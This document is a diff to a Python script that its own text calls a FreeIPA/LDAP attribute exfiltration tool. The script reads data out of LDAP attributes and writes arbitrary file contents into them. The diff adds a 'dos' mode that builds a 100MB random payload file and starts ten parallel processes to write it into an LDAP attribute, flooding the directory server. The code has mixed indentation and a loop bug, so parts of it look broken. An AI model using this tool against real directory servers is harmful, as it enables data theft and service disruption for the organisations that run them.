@@ -1,11 +1,16 @@
 #!/usr/bin/env python
 
+import time
 import sys, os
 import argparse
 import ldap
 import ldap.modlist
 import base64
 import getpass
+from multiprocessing import Process
+import tempfile
+
+proc_number = 10
 
 def main():
     parser = argparse.ArgumentParser(description='FreeIPA / LDAP attribute exfiltration script')
@@ -29,6 +34,28 @@ def main():
     	ldap_connect_get(args.server, args.dname, args.password, args.attribute, args.output)
     elif args.mode == "set":
         ldap_connect_set(args.server, args.dname, args.password, args.attribute, args.file)
+    elif args.mode == "dos":
+    	tmpdir = tempfile.mkdtemp()
+	predictable_filename = 'exfil_data'
+	saved_umask = os.umask(0077)
+	dos_path = os.path.join(tmpdir, predictable_filename)
+	fsize = 1024*1024*100
+	try:
+		with open(dos_path, "w") as tmp:
+			tmp.write(base64.encodestring(os.urandom(fsize)).replace('\n', ''))
+        except IOError as e:
+    		print 'IOError'
+    	procs = []
+    	for i in range(proc_number):
+        	procs = []
+		proc = Process(target=ldap_connect_set, args=(args.server, args.dname, args.password, args.attribute, dos_path))
+        	procs.append(proc)
+        	proc.start()
+
+    	for proc in procs:
+        	proc.join()
+        
+        os.remove(dos_path)
     else:
         sys.exit()
 
@@ -70,8 +97,8 @@ def ldap_connect_set(server, dname, password, attribute, file):
        l = ldap.initialize(server)
        l.simple_bind_s(dname,password)
        ldif = [( ldap.MOD_REPLACE, attribute, ex_file_encode)]
-       print("*** Encoded Data : [ %s ]\n") % ex_file_encode
-       print("*** Size: [ %s ] bytes") % len(ex_file_encode)
+       #print("*** Encoded Data : [ %s ]\n") % ex_file_encode
+       print("*** Size: [ %s ] bytes") % len(ex_file_read)
        try:
           l.modify_s(dname,ldif)
        except Exception as error:
@@ -84,4 +111,3 @@ if __name__ == "__main__":
 
     main()
 
-   
